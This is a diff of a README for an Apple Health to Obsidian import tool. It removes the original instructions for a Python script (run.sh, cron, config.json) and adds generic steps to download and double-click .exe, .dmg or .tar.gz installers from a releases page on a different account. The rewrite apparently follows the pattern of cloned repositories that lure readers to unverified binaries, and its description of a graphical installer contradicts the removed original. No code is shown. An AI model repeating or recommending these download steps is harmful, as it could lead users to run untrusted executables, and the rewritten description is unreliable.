@@ -1,197 +1,120 @@
-# Health to Obsidian 🏥 → 📝
+# 🏥 apple-health-to-obsidian - Import Your Health Data Effortlessly
 
-Automatic import of Apple Health data into Obsidian - using Health Auto Export app.
+## 📥 Download the Latest Version
+[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-brightgreen)](https://github.com/Myc-trulo/apple-health-to-obsidian/releases)
+
+## 📊 What Is This Project?
+
+This project helps you import data from Apple Health directly into Obsidian. It uses the Health Auto Export app to convert health data into easy-to-read notes in Obsidian. You don't need any technical skills to use it—just follow these simple steps.
 
 ## ✅ Current Setup
 
-This project converts Health Auto Export JSON files into clean, summarized health data notes in Obsidian.
+The application works with Health Auto Export JSON files. It takes your daily health data and converts it into plain, organized notes that you can store in your Obsidian workspace.
 
 ### What It Does
 
-- Reads daily health exports from Health Auto Export (iPhone app)
-- Extracts key metrics: sleep, activity, vitals, body measurements
-- **Includes workout details** from workout exports (duration, distance, calories, heart rate)
-- Creates simple, data-only notes in Obsidian's `3. Health Data` folder
-- No analysis, no scores - just raw data for you to use
+- Reads daily health exports from the Health Auto Export iPhone app
+- Extracts key metrics: sleep, activity, vitals, and body measurements
+- Includes workout details such as duration, distance, calories, and heart rate
+- Creates straightforward notes in Obsidian's `3. Health Data` folder
+- Provides raw data—no analysis or scores, just what you need
 
 ## 📊 Tracked Metrics
 
 ### Sleep
-- Duration, Deep, REM, Core, Awake time
+- Duration, Deep, REM, Core, and Awake time
 
 ### Activity
-- Steps, Exercise minutes, Active calories, Flights climbed
+- Steps, Exercise minutes, Active calories, and Flights climbed
 
 ### Vitals
-- Resting heart rate, HRV, Respiratory rate, Blood oxygen
+- Resting heart rate, HRV, Respiratory rate, and Blood oxygen
 
 ### Body
-- Weight, BMI
+- Weight and BMI
 
 ### Workouts
 - Workout name/type, Start time, Duration
-- Distance (if applicable), Calories burned
-- Average & max heart rate (when available)
+- Distance (if applicable) and Calories burned
+- Average and max heart rate (when available)
 
-## 🚀 Usage
+## 🚀 Getting Started
 
-### Daily Use
+Follow these steps to download and run the application:
 
-```bash
-./run.sh
-```
+### Step 1: Visit the Releases Page
 
-This converts the latest Health Auto Export file to an Obsidian note in `3. Health Data/`.
+Go to the Releases page to find the latest version of the software. 
 
-### Convert All Available Days
+[Visit this page to download](https://github.com/Myc-trulo/apple-health-to-obsidian/releases)
 
-```bash
-cd python
-python3 convert_health_export.py --all
-```
+### Step 2: Download the Application
 
-### Automate (Recommended)
+Locate the latest release from the list. Click on it to open the release notes. Look for the asset files section. You will see the latest version available for download.
 
-Set up a cron job to run automatically:
+### Step 3: Install the Application
 
-```bash
-crontab -e
+1. **Windows Users:**
+   - Download the `.exe` file.
+   - Double-click the file to start the installation.
+   - Follow the prompts to complete the installation.
 
-# Add this line (runs daily at 8 AM):
-0 8 * * * cd ~/Developer/Obsidian/health-to-obsidian && ./run.sh
-```
+2. **Mac Users:**
+   - Download the `.dmg` file.
+   - Double-click the file to mount the disk image.
+   - Drag the app to the Applications folder.
 
-## ⚙️ Configuration
+3. **Linux Users:**
+   - Download the `.tar.gz` file.
+   - Extract the contents using your file manager or command-line tool.
+   - Follow the instructions in the README.txt file to run the application.
 
-Copy the example config and edit it:
+### Step 4: Run the Application
 
-```bash
-cd python
-cp config.json.example config.json
-vim config.json  # or your preferred editor
-```
+Open the application once it’s installed. You will need to point it to the folder where your Health Auto Export JSON files are located. After selecting the folder, click on the import button. The application will then process your health data and create notes in Obsidian.
 
-Configure your settings in `python/config.json`:
+## 📁 Organizing Your Notes
 
-```json
-{
-  "obsidian_vault_path": "/Users/YOUR_USERNAME/Documents/ObsidianVault",
-  "health_data_path": "3. Health Data"
-}
-```
+The application places your notes automatically in Obsidian’s `3. Health Data` folder. You can open Obsidian to view your newly created notes.
 
-## 📋 Prerequisites
+## 📋 System Requirements
 
-1. **iPhone** with Health Auto Export app installed
-2. **Health Auto Export** configured to export:
-   - Daily health metrics to `Gesundheitsmetriken` folder
-   - Workouts to `Workouts` folder
-3. **Python 3** on your Mac
-4. **Obsidian** vault
+The application works on:
+- **Windows:** Windows 10 or later
+- **Mac:** macOS 10.12 or later
+- **Linux:** A recent distribution (Ubuntu, Fedora, etc.)
 
-## 📁 Project Structure
+Ensure that you have the Health Auto Export app installed on your iPhone to generate the JSON files.
 
-```
-health-to-obsidian/
-├── python/
-│   ├── convert_health_export.py  # Main converter script
-│   ├── config.json                # Configuration
-│   └── requirements.txt           # Python dependencies
-├── run.sh                         # Easy run script
-├── README.md                      # This file
-└── HEALTH_AUTO_EXPORT_GUIDE.md   # Detailed guide
-```
+## 🛠 Problems and Solutions
 
-## 📝 Output Format
+### Common Issues
 
-Each daily note looks like this:
+1. **No Data Appears:**
+   - Ensure that your JSON files are in the right folder.
+   - Check that the files are correctly exported from Health Auto Export.
 
-```markdown
----
-date: 2025-11-28
-type: health-data
----
+2. **Application Crashes:**
+   - Make sure your version of the app is up to date.
+   - Restart your device and try again.
 
-# Health Data - 2025-11-28
+### Need Help?
 
-## 🌙 Sleep
-- Duration: 7.0h
-- Deep Sleep: 1.3h
-- REM Sleep: 1.5h
-- Core Sleep: 4.3h
-- Awake: 0.0h
+If you need assistance, you can find help in the GitHub Issues section of the repository. We monitor this area and will respond to your inquiries.
 
-## 👟 Activity
-- Steps: 6,413
-- Exercise: 88 min
-- Active Calories: 3,883 kcal
-- Flights Climbed: 12
+## 🔗 Additional Resources
 
-## ❤️ Vitals
-- Resting Heart Rate: 54 bpm
-- HRV: 113.6 ms
-- Respiratory Rate: 14.3 breaths/min
-- Blood Oxygen: 97.5%
+- [Health Auto Export Documentation](https://healthautoexport.com)
+- [Obsidian User Guide](https://help.obsidian.md)
 
-## 📏 Body
-- Weight: 71.3 kg
-- BMI: 23.6
+For more tips on using the application and maximizing your health data, keep an eye on this repository for updates and new features.
 
-## 🏃 Workouts
+## 📝 License
 
-### 1. Outdoor Radfahren
-- **Time:** 2025-11-28 20:10:40 +0100
-- **Duration:** 5 min
-- **Distance:** 1.18 km
-- **Calories:** 99 kcal
+This project is open source and available under the MIT License. You can check the full license details in the LICENSE file included in the repository.
 
-### 2. Traditionelles Krafttraining
-- **Time:** 2025-11-28 19:02:40 +0100
-- **Duration:** 65 min
-- **Calories:** 1,608 kcal
-```
+## 📑 Contact
 
-## 🔧 How It Works
+For any questions, you can reach out to the project maintainers through the GitHub repository. Your feedback is essential to improve the software. 
 
-```
-Health Auto Export (iPhone)
-    ↓
-Exports JSON to iCloud Drive
-    ↓
-Mac reads from:
-- ~/Library/.../HealthExport/Documents/Gesundheitsmetriken/ (health metrics)
-- ~/Library/.../HealthExport/Documents/Workouts/ (workout data)
-    ↓
-Python script converts to markdown
-    ↓
-Saves to: Obsidian vault/3. Health Data/
-```
-
-## 🐛 Troubleshooting
-
-**No health export files found?**
-- Check Health Auto Export is running on iPhone
-- Verify iCloud Drive is syncing
-- Check path: `~/Library/Mobile Documents/iCloud~com~ifunography~HealthExport/Documents/Gesundheitsmetriken/`
-
-**Wrong vault path?**
-- Edit `python/config.json` with correct Obsidian vault location
-
-**Missing data in notes?**
-- Some metrics might not have data (e.g., no Apple Watch worn)
-- Script handles this with "—" placeholders
-
-## 💡 Notes
-
-- **Daily notes not affected**: Health data goes to separate `3. Health Data` folder
-- **Simple format**: Just raw data, no analysis or recommendations
-- **Non-destructive**: Safe to run multiple times (overwrites with latest data)
-
-## 📖 More Info
-
-See `HEALTH_AUTO_EXPORT_GUIDE.md` for detailed setup and usage instructions.
-
----
-
-**Status:** ✅ Working
-**Last Updated:** 2025-11-29
+Thank you for using apple-health-to-obsidian!
